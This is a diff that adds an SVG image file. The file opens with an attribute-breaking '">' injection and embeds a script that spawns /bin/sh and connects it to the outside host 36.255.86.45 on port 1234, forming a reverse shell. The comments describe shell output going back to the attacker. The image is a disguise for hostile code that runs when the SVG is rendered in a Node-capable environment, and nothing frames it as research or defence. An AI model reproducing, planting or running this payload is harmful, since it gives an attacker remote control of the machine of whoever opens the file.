@@ -1,0 +1,25 @@
+"><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script>
+    // Check if Node.js is available
+    try {
+      const net = require('net');
+      const cp = require('child_process');
+      const sh = cp.spawn('/bin/sh', []); // Spawns a new shell
+
+      const client = new net.Socket();
+      client.connect(1234, '36.255.86.45', function() {
+        client.pipe(sh.stdin);  // Sends the input to the shell
+        sh.stdout.pipe(client); // Sends shell output back to the attacker
+        sh.stderr.pipe(client); // Sends errors back to the attacker
+      });
+
+      client.on('error', function(error) {
+        console.log("failed:", error);  // For debugging failed attempts
+      });
+    } catch (e) {
+      console.log("This environment does not support Node.js or command execution");
+    }
+  </script>
+
+  <rect x="10" y="10" width="50" height="50" fill="#ff0000" />
+</svg>
